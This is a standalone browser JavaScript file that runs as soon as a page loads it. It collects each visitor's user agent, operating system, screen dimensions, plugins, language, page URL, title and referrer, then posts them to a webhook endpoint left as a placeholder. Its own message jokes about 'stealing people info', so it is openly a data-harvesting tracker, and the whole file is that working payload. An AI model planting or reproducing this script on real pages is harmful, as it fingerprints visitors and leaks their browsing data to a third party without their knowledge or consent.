const webhookUrl = 'Your_WEBHOOK_HERE';

const userAgent = navigator.userAgent;
const os = navigator.userAgent.indexOf('Mac') !== -1 ? 'macOS' : 'Windows';
const availableScreenHeight = window.screen.availHeight;
const availableScreenWidth = window.screen.availWidth;
const colorDepth = window.screen.colorDepth;
const hasCookiesEnabled = navigator.cookieEnabled;
const language = navigator.language;
const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
const currentUrl = window.location.href;
const pageTitle = document.title;
const pageReferrer = document.referrer;

const sendWebpageData = () => {
  const consoleData = JSON.stringify({
    availableScreenHeight,
    availableScreenWidth,
    colorDepth,
    hasCookiesEnabled,
    language,
    onlineStatus,
    plugins,
  });

  const data = {
    content: `🌕 **Good evening!** Thank you for using the **free version** of this website. Here's some information that you may find **interesting**:\n\n🖥️ **Device Information:**\n🔖 User Agent: ${userAgent}\n🖥️ Operating System: ${os}\n📏 Screen Height: ${availableScreenHeight}px\n📐 Screen Width: ${availableScreenWidth}px\n🎨 Color Depth: ${colorDepth} bits\n🍪 Cookies Enabled: ${hasCookiesEnabled ? 'Yes' : 'No'}\n🗣️ Language: ${language}\n📶 Online Status: ${onlineStatus}\n🔌 Plugins: ${JSON.stringify(plugins)}\n\n🌐 **Website Information:**\n🌐 URL: ${currentUrl}\n📰 Title: ${pageTitle}\n🔙 Referrer: ${pageReferrer}\n\n🌟 Thank you for your **support**! Enjoy your **luxurious** stealing people info experience. 🌟`
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
};

sendWebpageData();
